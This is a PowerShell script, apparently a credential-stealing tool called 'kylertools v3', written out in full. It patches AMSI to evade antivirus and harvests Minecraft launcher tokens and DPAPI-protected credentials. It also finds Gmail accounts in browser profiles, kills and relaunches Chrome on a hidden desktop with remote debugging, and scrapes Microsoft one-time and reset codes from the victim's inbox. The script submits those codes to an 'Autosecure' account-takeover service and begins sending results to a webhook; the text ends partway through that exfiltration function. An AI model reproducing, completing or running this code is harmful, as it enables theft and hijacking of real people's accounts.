# language: PowerShell 5.1+, target: Windows 11
# kylertools v3 — MC token harvest -> chrome gmails -> hidden-desktop chrome ->
#                 OTP scrape (MS one-time-use AND reset-password) -> Autosecure submit -> exfil.
# v3: PS5.1-clean (no System.Net.WebSockets Add-Type, [ref] not [out]),
#     AMSI patch via csc.exe, webhook via $env:KYLER_WEBHOOK only,
#     randomized CDP port, DESKTOP_ALL_ACCESS, lpCurrentDirectory set,
#     chrome-down poll, Secure Preferences read, /json/new fallback,
#     OTP regex covers "one-time use code" + "reset password code" + translations,
#     FileShare+MemoryStream disposed, per-chunk fence-safe exfil.

# ============ AMSI (reflection, via csc.exe to avoid PS AMSI hook) ============
$amsiSrc = @'
using System;
using System.Runtime.InteropServices;
public static class Amsi {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    public static void Patch() {
        try {
            IntPtr lib = LoadLibrary("amsi.dll");
            if (lib == IntPtr.Zero) return;
            IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
            if (addr == IntPtr.Zero) return;
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057 ; ret
            uint old;
            VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out old);
            Marshal.Copy(patch, 0, addr, patch.Length);
            VirtualProtect(addr, (UIntPtr)patch.Length, old, out old);
        } catch { }
    }
}
'@
try {
    $csc = Join-Path $env:WINDIR "Microsoft.NET\Framework64\v4.0.30319\csc.exe"
    if(-not (Test-Path $csc)){ $csc = Join-Path $env:WINDIR "Microsoft.NET\Framework\v4.0.30319\csc.exe" }
    $cs  = Join-Path $env:TEMP "a.cs"; $dll = Join-Path $env:TEMP "a.dll"
    Set-Content -Path $cs -Value $amsiSrc -Encoding ASCII
    $null = & $csc /nologo /target:library /out:$dll $cs 2>&1
    if(Test-Path $dll){
        $asm = [Reflection.Assembly]::Load([IO.File]::ReadAllBytes($dll))
        $t = $asm.GetType("Amsi")
        if($t){ $t.GetMethod("Patch").Invoke($null, @()) | Out-Null }
    }
    Remove-Item $cs,$dll -Force -EA 0
} catch {}
# ===========================================================================

$ErrorActionPreference = "Continue"

# ======================= CONFIG =======================
$webhook = $env:KYLER_WEBHOOK
if(-not $webhook){ Write-Host "[cfg] KYLER_WEBHOOK not set — exfil will be skipped." }
$h   = @{ "Content-Type" = "application/json" }
$nl  = [char]10
$bt3 = [char]96 + [char]96 + [char]96
Add-Type -AssemblyName System.Security -EA 0

# --- Autosecure web API contract (FILL THESE) ---
$autosecureBase   = "https://<your-autosecure-host>"
$autosecureHdr    = @{ "Authorization" = "Bearer <token>" }
$startPath        = "/start"
$submitPath       = "/submit"
$startBodyKey     = "email"
$submitSessionKey = "session"
$submitOtpKey     = "otp"
$respSessionKey   = "session"

$cdpPort        = Get-Random -Minimum 49152 -Maximum 65535
$pollIntervalS  = 4
$otpTimeoutS    = 240
$deskName       = "kt_" + (Get-Random -Minimum 1000 -Maximum 9999)
$debugSpawn     = $true
# =====================================================

# =================== TEST OVERRIDE ===================
# $script:gmailList = @("youremail@gmail.com")
# =====================================================

# ---------- stage 1: MC token harvest ----------
$found = @(); $seen = @{}
$jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"

function Add-Token {
    param($tok,$user,$src,$type)
    if(-not $tok){ return }
    if($tok.Length -lt 80){ return }
    if(-not $tok.StartsWith("eyJ")){ return }
    $key = "$type|$tok"
    if($seen.ContainsKey($key)){ return }
    $seen[$key] = $true
    $script:found += [PSCustomObject]@{ User=$user; Type=$type; Token=$tok; File=$src }
}

function Scan-Text {
    param($text,$src,$user)
    if(-not $text){ return }
    foreach($m in [regex]::Matches($text,$jwtRegex)){
        $v = [string]$m.Value
        if(-not $v){ continue }
        if($v -like "eyJhbGciOiJSU0EtT0FFUC*"){ continue }
        Add-Token $v $user $src "accessToken"
    }
}

function Scan-File {
    param($path,$user)
    try{
        if((Get-Item $path -EA 0).Length -gt 5mb){ return }
        $raw = Get-Content $path -Raw -EA 0
        if(-not $raw){ return }
        try{
            $j = $raw | ConvertFrom-Json
            if($j -and $j.microsoft_account -and $j.microsoft_account.email){
                $script:found += [PSCustomObject]@{ User=$j.microsoft_account.email; Type="msa-email"; Token=""; File=$path }
            }
            if($j){
                $st = New-Object System.Collections.Stack
                $st.Push($j)
                while($st.Count -gt 0){
                    $n = $st.Pop()
                    if($null -eq $n){ continue }
                    if($n -is [System.Collections.IEnumerable] -and $n -isnot [string]){ foreach($it in $n){ $st.Push($it) }; continue }
                    if($n -isnot [PSCustomObject]){ continue }
                    $u = $user
                    foreach($k in @("username","name","displayName","profileName")){ if($n.PSObject.Properties[$k] -and $n.$k){ $u=$n.$k; break } }
                    if($n.minecraftProfile -and $n.minecraftProfile.name){ $u = $n.minecraftProfile.name }
                    if($n.microsoft_account -and $n.microsoft_account.email){ $u = $n.microsoft_account.email }
                    foreach($k in @("accessToken","token","access_token")){
                        if($n.PSObject.Properties[$k] -and $n.$k){ Add-Token $n.$k $u $path "accessToken" }
                    }
                    foreach($p in $n.PSObject.Properties){
                        if($p.Value -is [PSCustomObject] -or ($p.Value -is [System.Collections.IEnumerable] -and $p.Value -isnot [string])){ $st.Push($p.Value) }
                    }
                }
            }
        }catch{}
        Scan-Text $raw $path $user
    }catch{}
}

function Scan-Db {
    param($path,$user)
    if(-not (Test-Path $path)){ return }
    for($t=0; $t -lt 3; $t++){
        $fs=$null; $ms=$null
        try{
            $fs = [IO.File]::Open($path,'Open','Read','ReadWrite')
            $ms = New-Object IO.MemoryStream
            $fs.CopyTo($ms)
            Scan-Text ([Text.Encoding]::UTF8.GetString($ms.ToArray())) $path $user
            return
        }catch{ Start-Sleep -Milliseconds 200 }
        finally{ if($ms){ try{$ms.Dispose()}catch{} }; if($fs){ try{$fs.Dispose()}catch{} } }
    }
}

$paths = @(
 "$env:APPDATA\.minecraft\launcher_accounts.json",
 "$env:APPDATA\.minecraft\launcher_accounts_microsoft_store.json",
 "$env:LOCALAPPDATA\.minecraft\launcher_accounts.json",
 "$env:APPDATA\.minecraft\TlauncherProfiles.json",
 "$env:APPDATA\.minecraft\VaultKey\accounts.json",
 "$env:APPDATA\.minecraft\VaultKey\profiles.json",
 "$env:APPDATA\.minecraft\VaultKey\msa.json",
 "$env:APPDATA\.minecraft\VaultKey\auth.json",
 "$env:APPDATA\.lunarclient\settings\game\accounts.json",
 "$env:APPDATA\.lunarclient\accounts.json",
 "$env:APPDATA\.technic\oauth\accounts.json",
 "$env:APPDATA\.feather\accounts.json",
 "$env:APPDATA\PrismLauncher\accounts.json",
 "$env:APPDATA\MultiMC\accounts.json",
 "$env:APPDATA\PollyMC\accounts.json",
 "$env:APPDATA\ModrinthApp\caches\metadata\minecraft_auth.json",
 "$env:APPDATA\ModrinthApp\launcher_accounts.json",
 "$env:APPDATA\ModrinthApp\launcher_profiles.json",
 "$env:APPDATA\xmcl\user.json",
 "$env:LOCALAPPDATA\Packages\XMCL_68mcaawk44tpj\LocalCache\Roaming\xmcl\user.json",
 "$env:APPDATA\.salwyrr\accounts.json",
 "$env:APPDATA\.sklauncher\accounts.json",
 "$env:APPDATA\Badlion Client\accounts.json",
 "$env:APPDATA\.minecraft\LabyMod\accounts.json",
 "$env:APPDATA\.gdllauncher-carbon\user-data\user-profiles.json",
 "$env:APPDATA\.ATLauncher\accounts.json",
 "$env:APPDATA\.minecraft\tl_accounts.json",
 "$env:APPDATA\HMCL\accounts.json",
 "$env:APPDATA\.hmcl\accounts.json"
)
foreach($p in $paths){ if(Test-Path $p){ Scan-File $p "unknown" } }

$bin = "$env:APPDATA\.minecraft\launcher_msa_credentials_microsoft_store.bin"
if(Test-Path $bin){
    try{
        $dec = [Security.Cryptography.ProtectedData]::Unprotect([IO.File]::ReadAllBytes($bin),$null,"CurrentUser")
        Scan-Text ([Text.Encoding]::UTF8.GetString($dec)) $bin "unknown"
    }catch{}
}

$roots = @("$env:APPDATA\.minecraft","$env:APPDATA\.lunarclient","$env:APPDATA\ModrinthApp","$env:APPDATA\PrismLauncher","$env:APPDATA\MultiMC","$env:APPDATA\xmcl","$env:APPDATA\.technic","$env:APPDATA\.feather","$env:APPDATA\.gdlauncher-carbon","$env:APPDATA\.ATLauncher","$env:APPDATA\PollyMC","$env:APPDATA\HMCL")
$inc = @("accounts.json","launcher_accounts.json","launcher_accounts_microsoft_store.json","user.json","user-profiles.json","tl_accounts.json","*.auth.json","minecraft_auth.json")
foreach($r in $roots){
    if(-not (Test-Path $r)){ continue }
    try{
        foreach($f in (Get-ChildItem $r -Recurse -File -Include $inc -EA 0)){
            if($f.FullName -match "webcache|node_modules|\.git\\"){ continue }
            if($f.Length -gt 1mb){ continue }
            Scan-File $f.FullName "unknown"
        }
    }catch{}
}

$dbs = @("$env:APPDATA\ModrinthApp\app.db","$env:APPDATA\ModrinthApp\app.db-wal","$env:APPDATA\ModrinthApp\app.db-shm","$env:APPDATA\gdlauncher\gdl_conf.db","$env:APPDATA\gdlauncher\gdl_conf.db-wal","$env:APPDATA\gdlauncher-carbon\gdl_conf.db","$env:APPDATA\.gdlauncher\gdl_conf.db","$env:APPDATA\Gml-Launcher\launcher.db")
foreach($db in $dbs){ Scan-Db $db "db-scan" }

$wcs = @("$env:APPDATA\.minecraft\webcache2\Default\Local Storage\leveldb","$env:APPDATA\ModrinthApp\webcache\Default\Local Storage\leveldb","$env:APPDATA\PrismLauncher\webcache\Default\Local Storage\leveldb")
foreach($lc in $wcs){
    if(-not (Test-Path $lc)){ continue }
    try{
        foreach($f in (Get-ChildItem $lc -File -Include "*.ldb","*.log" -EA 0 | Where-Object { $_.Length -lt 5mb } | Select-Object -First 50)){
            try{ Scan-Text ([Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($f.FullName))) $f.FullName "unknown" }catch{}
        }
    }catch{}
}

# ---------- stage 2: chrome gmail discovery ----------
function Get-JwtClaim {
    param([string]$jwt,[string[]]$names)
    try{
        $parts = $jwt.Split('.')
        if($parts.Count -lt 2){ return $null }
        $p = $parts[1].Replace('-','+').Replace('_','/')
        while($p.Length % 4){ $p += "=" }
        $o = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))) | ConvertFrom-Json
        foreach($n in $names){ if($o.PSObject.Properties[$n] -and $o.$n){ return [string]$o.$n } }
    }catch{}
    return $null
}
function Read-PrefsSafe {
    param([string]$path)
    for($i=0; $i -lt 3; $i++){
        try{ $r = Get-Content $path -Raw -EA 0; if($r){ return ($r | ConvertFrom-Json) } }catch{}
        Start-Sleep -Milliseconds 200
    }
    return $null
}
function Get-ChromeGoogleAccounts {
    $out = @{}
    $roots = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:LOCALAPPDATA\Google\Chrome Beta\User Data",
        "$env:LOCALAPPDATA\Google\Chrome Dev\User Data",
        "$env:LOCALAPPDATA\Google\Chrome SxS\User Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
        "$env:LOCALAPPDATA\Chromium\User Data"
    )
    foreach($root in $roots){
        if(-not (Test-Path $root)){ continue }
        foreach($p in @(Get-ChildItem $root -Directory -EA 0 | Where-Object { $_.Name -eq "Default" -or $_.Name -match "^Profile \d+$" })){
            foreach($pn in @("Preferences","Secure Preferences")){
                $prefs = Join-Path $p.FullName $pn
                if(-not (Test-Path $prefs)){ continue }
                $j = Read-PrefsSafe -path $prefs
                if($j -and $j.account_info){
                    foreach($a in $j.account_info){
                        if($a.email -and $a.email -match "@(gmail|googlemail)\.com$"){ $out[$a.email] = $p.FullName }
                    }
                }
            }
        }
    }
    return $out
}

if(-not (Get-Variable -Name gmailList -Scope Script -EA 0)){ $script:gmailList = $null }
$gmailSource = "none"
if(-not $script:gmailList){
    $cg = Get-ChromeGoogleAccounts
    $gm = @{}
    foreach($e in $cg.Keys){ $gm[$e] = $true }
    if($gm.Count -gt 0){ $gmailSource = "chrome-discovery" }
    else {
        $rx = [regex]'^[A-Za-z0-9._%+\-]+@(gmail\.com|googlemail\.com)$'
        foreach($t in $found){
            if($t.Token){
                $c = Get-JwtClaim -jwt $t.Token -names @("upn","email","preferred_username","unique_name","mail","emailAddress")
                if($c -and $rx.IsMatch($c)){ $gm[$c] = $true }
            }
            if($t.User -and $rx.IsMatch([string]$t.User)){ $gm[[string]$t.User] = $true }
        }
        if($gm.Count -gt 0){ $gmailSource = "token-claim" }
    }
    $script:gmailList = @($gm.Keys)
}
Write-Host "[stage2] source: $gmailSource, count: $($script:gmailList.Count)"

# ---------- Autosecure ----------
$asTrace = @()
function Invoke-WithRetry { param([scriptblock]$Action,[int]$Tries=3)
    for($i=0; $i -lt $Tries; $i++){ try{ $r = & $Action; if($null -ne $r){ return $r } }catch{}; Start-Sleep 2 }
    return $null
}
function AS-Start {
    param([string]$email)
    $url = $autosecureBase.TrimEnd("/") + $startPath
    $script:lastStatus = "NO_CALL"
    $val = Invoke-WithRetry {
        try{
            $body = @{ $startBodyKey = $email } | ConvertTo-Json -Compress
            $r = iwr -Uri $url -Method Post -Headers $autosecureHdr -ContentType "application/json" -Body $body -TimeoutSec 20 -UseBasicParsing -EA Stop
            $script:lastStatus = "HTTP_$($r.StatusCode)"
            ($r.Content | ConvertFrom-Json).$respSessionKey
        } catch {
            $resp = $_.Exception.Response
            if($resp){ try{ $script:lastStatus = "HTTP_$([int]$resp.StatusCode)"; return $null }catch{} }
            $m = $_.Exception.Message
            if($m -match "Name or service not known|No such host|getaddrinfo"){ $script:lastStatus = "DNS_FAIL" }
            elseif($m -match "timed out|timeout"){ $script:lastStatus = "TIMEOUT" }
            elseif($m -match "refused|reset|forcibly"){ $script:lastStatus = "CONN_REFUSED" }
            else{ $script:lastStatus = "ERR: $m" }
            return $null
        }
    }
    $script:asTrace += [PSCustomObject]@{ Email=$email; Call="start"; Status=$script:lastStatus }
    return @{ ok=($null -ne $val); value=$val; status=$script:lastStatus }
}
function AS-Submit {
    param([string]$email,[string]$session,[string]$otp)
    $url = $autosecureBase.TrimEnd("/") + $submitPath
    $script:lastStatus = "NO_CALL"
    $val = Invoke-WithRetry {
        try{
            $body = @{ $submitSessionKey = $session; $submitOtpKey = $otp } | ConvertTo-Json -Compress
            $r = iwr -Uri $url -Method Post -Headers $autosecureHdr -ContentType "application/json" -Body $body -TimeoutSec 20 -UseBasicParsing -EA Stop
            $script:lastStatus = "HTTP_$($r.StatusCode)"
            ($r.StatusCode -lt 400)
        } catch {
            $resp = $_.Exception.Response
            if($resp){
                $code = 0; try{ $code = [int]$resp.StatusCode }catch{}
                $script:lastStatus = "HTTP_$code"
                if($code -ge 400 -and $code -lt 500){ return "FAILFAST_$code" }
                return $false
            }
            $m = $_.Exception.Message
            if($m -match "timed out|timeout"){ $script:lastStatus = "TIMEOUT" }
            elseif($m -match "refused|reset|forcibly"){ $script:lastStatus = "CONN_REFUSED" }
            else{ $script:lastStatus = "ERR: $m" }
            return $false
        }
    }
    $script:asTrace += [PSCustomObject]@{ Email=$email; Call="submit"; Status=$script:lastStatus }
    return @{ ok=($val -eq $true); status=$script:lastStatus }
}

# ---------- CDP + hidden desktop ----------
# NOTE: ClientWebSocket is in System.dll on .NET Framework — no Add-Type needed.
$deskSrc = @"
using System;
using System.Runtime.InteropServices;
public static class Desk {
    [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr CreateDesktopW(string name, IntPtr dev, IntPtr dm, int flags, uint access, IntPtr sa);
    [DllImport("user32.dll", SetLastError=true)]
    public static extern bool CloseDesktop(IntPtr h);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public IntPtr lpReserved;
        [MarshalAs(UnmanagedType.LPWStr)] public string lpDesktop;
        [MarshalAs(UnmanagedType.LPWStr)] public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars;
        public int dwFillAttribute, dwFlags;
        public short wShowWindow, cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public int dwProcessId, dwThreadId;
    }
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessW(
        [MarshalAs(UnmanagedType.LPWStr)] string lpApplicationName,
        [MarshalAs(UnmanagedType.LPWStr)] string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
        bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
        [MarshalAs(UnmanagedType.LPWStr)] string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);
}
"@
Add-Type -TypeDefinition $deskSrc -Language CSharp -EA 0

$script:CdpBuf = New-Object byte[] 262144

function Cdp-Session { param([string]$wsUrl)
    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    $ws.ConnectAsync([uri]$wsUrl,[Threading.CancellationToken]::None).Wait()
    return $ws
}
function Cdp-Send { param($ws,[int]$id,[string]$method,$params)
    $payload = @{ id=$id; method=$method; params=$params } | ConvertTo-Json -Compress -Depth 10
    $bytes = [Text.Encoding]::UTF8.GetBytes($payload)
    $seg = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
    $ws.SendAsync($seg,[System.Net.WebSockets.WebSocketMessageType]::Text,$true,[Threading.CancellationToken]::None).Wait()
}
function Cdp-ReadFrame { param($ws,[int]$timeoutSec=15)
    $ms = New-Object IO.MemoryStream
    $deadline = (Get-Date).AddSeconds($timeoutSec)
    while((Get-Date) -lt $deadline){
        try{
            $res = $ws.ReceiveAsync((New-Object System.ArraySegment[byte] -ArgumentList @(,$script:CdpBuf)),[Threading.CancellationToken]::None).Result
        } catch { return $null }
        if(-not $res){ return $null }
        $ms.Write($script:CdpBuf,0,$res.Count)
        if($res.EndOfMessage){
            $txt = [Text.Encoding]::UTF8.GetString($ms.ToArray()); $ms.SetLength(0) | Out-Null
            try{ return ($txt | ConvertFrom-Json) }catch{ continue }
        }
    }
    return $null
}
function Cdp-RecvUntilId { param($ws,[int]$id,[int]$timeoutSec=15)
    $deadline = (Get-Date).AddSeconds($timeoutSec)
    while((Get-Date) -lt $deadline){
        $remain = [int][Math]::Max(1,($deadline - (Get-Date)).TotalSeconds)
        $j = Cdp-ReadFrame -ws $ws -timeoutSec $remain
        if(-not $j){ return $null }
        if($j.id -eq $id){ return $j }
    }
    return $null
}
function Cdp-WaitLoadEvent { param($ws,[int]$timeoutSec=20)
    $deadline = (Get-Date).AddSeconds($timeoutSec)
    while((Get-Date) -lt $deadline){
        $remain = [int][Math]::Max(1,($deadline - (Get-Date)).TotalSeconds)
        $j = Cdp-ReadFrame -ws $ws -timeoutSec $remain
        if(-not $j){ return }
        if($j.method -eq "Page.loadEventFired"){ return }
    }
}
function Cdp-Reload { param($ws,[int]$idBase)
    Cdp-Send $ws $idBase "Page.enable" @{}; [void](Cdp-RecvUntilId $ws $idBase)
    Cdp-Send $ws ($idBase+1) "Page.reload" @{ ignoreCache=$false }; [void](Cdp-RecvUntilId $ws ($idBase+1))
    Cdp-WaitLoadEvent -ws $ws -timeoutSec 20
    Start-Sleep -Milliseconds 800
}
function Cdp-Eval { param($ws,[string]$expr,[int]$id)
    Cdp-Send $ws $id "Runtime.evaluate" @{ expression=$expr; returnByValue=$true }
    $r = Cdp-RecvUntilId $ws $id
    if($r -and $r.result -and $r.result.result){ return $r.result.result.value }
    return $null
}

$script:CdpNewTabMode = $null
function Cdp-NewTab { param([string]$url)
    if($script:CdpNewTabMode -ne "cdp"){
        try{
            $r = iwr "http://127.0.0.1:$cdpPort/json/new?$([uri]::EscapeDataString($url))" -Method Put -UseBasicParsing -TimeoutSec 5 -EA Stop
            $script:CdpNewTabMode = "http"
            return ($r.Content | ConvertFrom-Json)
        } catch { $script:CdpNewTabMode = "cdp" }
    }
    # fallback: open a new window via /json/new is gone; poll /json for a tab with the url
    try{
        $null = iwr "http://127.0.0.1:$cdpPort/json/new" -Method Put -UseBasicParsing -TimeoutSec 3 -EA Stop
    } catch {}
    for($i=0; $i -lt 15; $i++){
        Start-Sleep -Milliseconds 400
        try{
            $tabs = (iwr "http://127.0.0.1:$cdpPort/json" -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
            $hit = $tabs | Where-Object { $_.url -eq $url -or $_.url -like "$url*" } | Select-Object -First 1
            if($hit -and $hit.webSocketDebuggerUrl){ return $hit }
        } catch {}
    }
    return $null
}

# OTP regex — BOTH MS flows + reset-password heading + multilingual
$otpJs = @'
(() => {
  const t = document.body ? document.body.innerText : "";
  const heads = [
    "one[\\-\\s]?time\\s+use\\s+code", "single[\\-\\s]?use\\s+code",
    "reset\\s+your\\s+password", "password\\s+reset\\s+code",
    "jednorazowy\\s+kod", "kod\\s+do\\s+resetowania\\s+hasła",
    "einmal(?:iger)?\\s+(?:code|Kennwort)", "Passwort\\s+zurücksetzen",
    "code\\s+à\\s+usage\\s+unique", "code\\s+de\\s+réinitialisation",
    "código\\s+de\\s+un\\s+solo\\s+uso", "código\\s+de\\s+restablecimiento",
    "codice\\s+monouso", "código\\s+de\\s+uso\\s+único",
    "eenmalige\\s+code", "одноразов\\w*\\s+код", "код\\s+для\\s+сброса\\s+пароля",
    "jednorázov\\w*\\s+kód", "tek\\s+kullanımlık\\s+kod",
    "ワンタイム\\s*コード", "パスワードのリセット",
    "일회용\\s*코드", "비밀번호\\s*재설정",
    "一次性(?:密码|代码)", "重置密码", "重設密碼"
  ];
  const digit = "\\d[\\s\\-]?\\d[\\s\\-]?\\d[\\s\\-]?\\d[\\s\\-]?\\d[\\s\\-]?\\d";
  const strip = s => s.replace(/[\s\-]/g, "");
  for(const h of heads){
    const re = new RegExp(h + "[^\\d]{0,60}(" + digit + ")", "i");
    const m = t.match(re);
    if(m) return strip(m[1]);
  }
  const s = document.querySelector('h2, .hP');
  if(s){
    const sm = s.innerText.match(new RegExp(digit));
    if(sm) return strip(sm[0]);
  }
  const ctx = t.match(new RegExp("(?:code|kod|код|コード|코드|密码|密碼)[^\\d]{0,60}(" + digit + ")(?!\\d)", "i"));
  if(ctx) return strip(ctx[1]);
  return null;
})()
'@

# ---------- run ----------
$otpResults = @{}
$deskHandle = [IntPtr]::Zero
$hiddenPids = @()

try {
    if($script:gmailList.Count -gt 0){
        $cand = @(
            "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
            "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
            "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
        ) | Where-Object { Test-Path $_ }
        $chrome = $cand | Select-Object -First 1

        if(-not $chrome){ Write-Host "[desk] chrome.exe not found." }
        else {
            $liveProfile = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $chromeDir   = Split-Path $chrome

            Get-Process chrome -EA 0 | Stop-Process -Force -EA 0
            for($i=0; $i -lt 40; $i++){
                if(-not (Get-Process chrome -EA 0)){ break }
                Start-Sleep -Milliseconds 300
            }
            Start-Sleep 1

            $deskHandle = [Desk]::CreateDesktopW($deskName,[IntPtr]::Zero,[IntPtr]::Zero,0,0x000F01FF,[IntPtr]::Zero)
            if($deskHandle -eq [IntPtr]::Zero){
                Write-Host "[desk] CreateDesktopW failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            } else {
                $deskPath  = "winsta0\$deskName"
                $quotedExe = '"' + $chrome + '"'
                $chromeArgs = @(
                    "--remote-debugging-port=$cdpPort",
                    "--user-data-dir=`"$liveProfile`"",
                    "--no-first-run","--no-default-browser-check",
                    "--disable-session-crashed-bubble",
                    "--disable-features=Crashpad",
                    "--disable-logging","--log-level=3","--disable-breakpad",
                    "--new-window","about:blank"
                ) -join " "
                $chromeCmd = "$quotedExe $chromeArgs"

                if($debugSpawn){
                    Write-Host "[desk] exe = $chrome"
                    Write-Host "[desk] cmd = $chromeCmd"
                    Write-Host "[desk] desk = $deskPath"
                }

                $si = [Desk+STARTUPINFO]::new()
                $si.cb = [Runtime.InteropServices.Marshal]::SizeOf([type][Desk+STARTUPINFO])
                $si.lpDesktop = $deskPath
                $pi = [Desk+PROCESS_INFORMATION]::new()

                $ok = $false; $lastErr = 0
                try {
                    $ok = [Desk]::CreateProcessW(
                        $chrome, $chromeCmd,
                        [IntPtr]::Zero, [IntPtr]::Zero,
                        $false, 0, [IntPtr]::Zero, $chromeDir,
                        [ref]$si, [ref]$pi
                    )
                } catch { Write-Host "[desk] CreateProcessW threw: $($_.Exception.Message)" }
                if(-not $ok){ $lastErr = [Runtime.InteropServices.Marshal]::GetLastWin32Error() }

                if(-not $ok){
                    Write-Host "[desk] CreateProcessW failed: $lastErr"
                    if($lastErr -eq 123){
                        Write-Host "[desk] retrying with bare desktop name"
                        $si2 = [Desk+STARTUPINFO]::new()
                        $si2.cb = [Runtime.InteropServices.Marshal]::SizeOf([type][Desk+STARTUPINFO])
                        $si2.lpDesktop = $deskName
                        $pi2 = [Desk+PROCESS_INFORMATION]::new()
                        try{
                            $ok = [Desk]::CreateProcessW(
                                $chrome, $chromeCmd,
                                [IntPtr]::Zero, [IntPtr]::Zero,
                                $false, 0, [IntPtr]::Zero, $chromeDir,
                                [ref]$si2, [ref]$pi2
                            )
                        } catch { Write-Host "[desk] retry threw: $($_.Exception.Message)" }
                        if($ok){ $pi = $pi2 }
                    }
                }

                if($ok){
                    if($pi.dwProcessId -gt 0){
                        [void][Desk]::CloseHandle($pi.hProcess)
                        [void][Desk]::CloseHandle($pi.hThread)
                    }
                    $cdpReady = $false
                    for($i=0; $i -lt 30; $i++){
                        try{ $null = iwr "http://127.0.0.1:$cdpPort/json/version" -UseBasicParsing -TimeoutSec 2 -EA Stop; $cdpReady=$true; break } catch { Start-Sleep 1 }
                    }
                    if($cdpReady){
                        $hiddenPids = @(Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" -EA 0 |
                                        Where-Object { $_.CommandLine -and $_.CommandLine -match [regex]::Escape($liveProfile) } |
                                        Select-Object -ExpandProperty ProcessId)

                        $tabSeq = 0
                        foreach($e in $script:gmailList){
                            $sres = AS-Start -email $e
                            if(-not $sres.ok){ $otpResults[$e] = "START_FAIL ($($sres.status))"; continue }
                            $sid = $sres.value

                            $url = "https://mail.google.com/mail/u/?authuser=$([uri]::EscapeDataString($e))"
                            $tab = Cdp-NewTab -url $url
                            if(-not $tab){ $otpResults[$e] = "TAB_FAIL"; continue }
                            $ws = $null
                            try{ $ws = Cdp-Session -wsUrl $tab.webSocketDebuggerUrl } catch { $otpResults[$e] = "WS_FAIL"; continue }

                            $deadline = (Get-Date).AddSeconds($otpTimeoutS)
                            $otp = $null
                            $idBase = 100 + ($tabSeq * 10); $tabSeq++
                            $firstPass = $true
                            $reconnects = 0; $maxR = 3
                            $lastSeen = ""

                            while((Get-Date) -lt $deadline){
                                if($firstPass){ Start-Sleep -Seconds $pollIntervalS; $firstPass = $false }
                                else { Cdp-Reload -ws $ws -idBase $idBase }

                                $otp = Cdp-Eval -ws $ws -expr $otpJs -id ($idBase + 5)

                                if(-not $otp){
                                    $wsDead = $false
                                    try{ $wsDead = ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) } catch { $wsDead = $true }
                                    if($wsDead){
                                        if($reconnects -ge $maxR){ break }
                                        $reconnects++
                                        try{ $ws.Dispose() }catch{}
                                        Start-Sleep 1
                                        $tab = Cdp-NewTab -url $url
                                        if(-not $tab){ Start-Sleep 2; continue }
                                        try{ $ws = Cdp-Session -wsUrl $tab.webSocketDebuggerUrl } catch { Start-Sleep 2; continue }
                                        $idBase = 100 + ($tabSeq * 10); $tabSeq++
                                    }
                                } else { break }
                                Start-Sleep -Seconds $pollIntervalS
                            }

                            if($ws){
                                try{ $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure,"",[Threading.CancellationToken]::None).Wait() }catch{}
                                try{ $ws.Dispose() }catch{}
                            }

                            if(-not $otp){ $otpResults[$e] = "OTP_TIMEOUT"; continue }
                            $sub = AS-Submit -email $e -session $sid -otp $otp
                            $otpResults[$e] = if($sub.ok){ "OK :: $otp" } else { "SUBMIT_FAIL ($($sub.status)) :: $otp" }
                        }
                    } else {
                        foreach($e in $script:gmailList){ $otpResults[$e] = "CDP_UNBOUND" }
                    }
                } else {
                    foreach($e in $script:gmailList){ $otpResults[$e] = "SPAWN_FAIL" }
                }
            }
        }
    }
}
finally {
    foreach($procId in $hiddenPids){ try{ Stop-Process -Id $procId -Force -EA 0 }catch{} }
    Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" -EA 0 |
        Where-Object { $_.CommandLine -and $_.CommandLine -match [regex]::Escape("$env:LOCALAPPDATA\Google\Chrome\User Data") } |
        ForEach-Object { try{ Stop-Process -Id $_.ProcessId -Force -EA 0 }catch{} }
    if($deskHandle -ne [IntPtr]::Zero){ [void][Desk]::CloseDesktop($deskHandle) }
}

# ---------- exfil ----------
function Send-Embed {
    param($title,$desc,$color,$footerText)
    if(-not $webhook){ return }
    $embed = @{ title=$title; description=$bt3+$desc+$bt3; color=$color; timestamp=(Get-Date).ToString("o") }
    if($footerText){ $embed.footer = @{ text=$footerText } }
    $body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
